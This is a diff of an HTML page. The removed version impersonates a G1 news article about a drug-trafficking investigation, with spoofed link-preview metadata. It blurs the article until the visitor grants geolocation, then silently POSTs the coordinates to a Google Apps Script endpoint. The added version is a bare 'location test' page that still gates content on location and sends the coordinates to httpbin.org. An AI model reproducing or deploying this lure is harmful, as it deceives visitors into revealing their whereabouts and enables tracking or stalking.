@@ -3,87 +3,10 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>G1.globo.com - Notícias</title>
-
-  <!-- Open Graph -->
-  <meta property="og:title" content="Polícia identifica principais traficantes de 'droga da elite' no país" />
-  <meta property="og:description" content="Quadrilha liderada por jovem foragido movimenta milhões com o tráfico do dry e do ice — variações sofisticadas do haxixe puro." />
-  <meta property="og:image" content="https://sbtnews.sbt.com.br/_next/image?url=https%3A%2F%2Fsbt-news-assets-prod.s3.sa-east-1.amazonaws.com%2Fhaxixi_droga_da_elite_5c982b4753.jpeg&w=1920&q=90" />
-  <meta property="og:url" content="https://www.seusite.com.br" />
-  <meta property="og:type" content="website" />
-
+  <title>Teste de Localização</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      background-color: #f5f5f5;
-      color: #222;
-      overflow: auto;
-    }
-
-    .top-image {
-      width: 100%;
-      max-height: 300px;
-      object-fit: cover;
-      display: block;
-    }
-
-    header {
-      background-color: #c4170c;
-      padding: 10px 20px;
-      color: white;
-    }
-
-    header h1 {
-      margin: 0;
-      font-size: 28px;
-    }
-
-    nav {
-      background-color: #e62117;
-      color: white;
-      padding: 8px 20px;
-      font-size: 14px;
-    }
-
-    .container {
-      max-width: 800px;
-      margin: 20px auto;
-      background: white;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-
-    .title {
-      font-size: 26px;
-      color: #c4170c;
-      margin-bottom: 10px;
-      font-weight: bold;
-    }
-
-    .subinfo {
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 20px;
-    }
-
-    .content {
-      font-size: 18px;
-      line-height: 1.6;
-      color: #333;
-    }
-
-    footer {
-      background-color: #c4170c;
-      color: white;
-      text-align: center;
-      padding: 10px;
-      margin-top: 40px;
-      font-size: 14px;
-    }
-
-    .blurred {
-      filter: blur(8px);
+    body.blurred {
+      filter: blur(6px);
       pointer-events: none;
       user-select: none;
     }
@@ -91,26 +14,26 @@
     #overlay {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.6);
-      z-index: 10;
+      background: rgba(0,0,0,0.7);
+      color: white;
+      font-family: sans-serif;
+      font-size: 18px;
+      z-index: 9999;
       display: flex;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
-      color: white;
-      font-size: 18px;
-      font-family: Arial, sans-serif;
+      justify-content: center;
       text-align: center;
       padding: 20px;
     }
 
     #overlay button {
-      margin-top: 15px;
+      margin-top: 20px;
       padding: 10px 20px;
       font-size: 16px;
-      background-color: #ffffff33;
-      color: white;
-      border: 1px solid #fff;
+      background: #fff;
+      color: #000;
+      border: none;
       border-radius: 5px;
       cursor: pointer;
     }
@@ -118,70 +41,55 @@
 </head>
 <body class="blurred">
 
-  <img class="top-image" src="https://sbtnews.sbt.com.br/_next/image?url=https%3A%2F%2Fsbt-news-assets-prod.s3.sa-east-1.amazonaws.com%2Fhaxixi_droga_da_elite_5c982b4753.jpeg&w=1920&q=90" alt="Droga da elite apreendida" />
-
-  <header>
-    <h1>G1</h1>
-  </header>
-
-  <nav>
-    <span>Notícias</span> &nbsp; | &nbsp; Segurança &nbsp; | &nbsp; Investigação &nbsp; | &nbsp; Justiça &nbsp; | &nbsp; Crime Organizado
-  </nav>
-
-  <div class="container">
-    <div class="title">Polícia identifica principais traficantes de "droga da elite" no país</div>
-    <div class="subinfo">31/07/2025 18h45 - Atualizado há poucos minutos</div>
-
-    <div class="content">
-      <!-- Conteúdo da notícia -->
-      <p>Uma operação do Departamento de Investigações Criminais (Deic) revelou os nomes por trás da distribuição do “dry marroquino” e do “ice” — variações potentes e refinadas do haxixe, conhecidas como “droga da elite”. Com valor de mercado que pode atingir até R$ 60 mil por quilo, as substâncias circulam em ambientes de luxo...</p>
-      <!-- ... restante omitido para brevidade ... -->
-    </div>
-  </div>
-
-  <footer>
-    © 2025 G1 - Todos os direitos reservados
-  </footer>
-
   <div id="overlay">
     Este site precisa da sua localização para continuar.<br>
-    Deseja permitir?<br><br>
-    <button onclick="solicitarLocalizacao()">Permitir localização</button>
+    Por favor, clique no botão abaixo:<br>
+    <button onclick="pedirLocalizacao()">Permitir localização</button>
+  </div>
+
+  <div style="padding: 30px;">
+    <h1>Conteúdo da Página</h1>
+    <p>Este conteúdo só aparece quando a localização é permitida.</p>
   </div>
 
   <script>
-    function solicitarLocalizacao() {
+    function pedirLocalizacao() {
       if (!navigator.geolocation) {
-        alert("Seu navegador não suporta geolocalização.");
+        alert("Geolocalização não é suportada neste navegador.");
         return;
       }
 
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
 
-        const url = "https://script.google.com/macros/s/AKfycbwk5F09_2ajt_z2a054KA369U7s33QNwLiTu1AO06KbvU4mRUgQixX-yICwbMzYLxHF/exec";
-        const payload = { latitude: lat, longitude: lon };
+          console.log("Localização:", lat, lon);
 
-        try {
-          await fetch(url, {
-            method: "POST",
-            body: JSON.stringify(payload)
-          });
-        } catch (e) {
-          console.warn("Erro ao enviar localização:", e);
+          // Envio para servidor (remova isso se não quiser testar agora)
+          try {
+            await fetch("https://httpbin.org/post", {
+              method: "POST",
+              body: JSON.stringify({ lat, lon }),
+              headers: {
+                "Content-Type": "application/json"
+              }
+            });
+          } catch (e) {
+            console.warn("Erro ao enviar localização:", e);
+          }
+
+          liberarConteudo();
+        },
+        (error) => {
+          alert("Permissão de localização negada.");
         }
-
-        liberarConteudo();
-
-      }, (error) => {
-        alert("Permissão negada. Não é possível continuar sem localização.");
-      });
+      );
     }
 
     function liberarConteudo() {
-      document.body.classList.remove('blurred');
-      document.getElementById('overlay').style.display = 'none';
+      document.body.classList.remove("blurred");
+      document.getElementById("overlay").style.display = "none";
     }
   </script>
 
